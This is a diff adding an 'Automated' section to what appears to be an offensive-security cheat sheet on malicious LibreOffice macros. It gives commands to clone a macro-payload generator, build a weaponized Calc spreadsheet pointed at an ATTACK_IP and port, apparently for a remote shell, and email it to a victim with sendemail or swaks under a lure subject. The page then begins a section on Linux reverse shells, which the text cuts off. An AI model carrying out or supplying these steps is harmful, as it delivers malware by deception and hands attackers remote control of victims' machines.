@@ -1,5 +1,25 @@
 # LibreOffice Macros
 
+## Automated
+
+### 1) Download the tool from GitHub
+
+    git clone https://github.com/0bfxgh0st/MMG-LO
+
+### 2) Generate payload based on the attack
+
+LibreOffice Calc
+
+    python3 mmg-ods.py windows ATTACK_IP PORT
+
+### 3) Send email to victim
+
+    sendemail -f 'sender@localhost' -t 'recipient@localhost' -s TARGET_IP:25 -u 'Your Spreadsheet' -m 'Here is your Spreadsheet' -a file.ods
+
+OR
+
+    swaks -t recipient@localhost --from sender@localhost --attach @file.ods --server TARGET_IP --body "Please check this spreadsheet" --header "Subject: Please check this spreadsheet"
+
 ## Linux Targets
 
 ### 1) Generate a Linux-compatible reverse shell
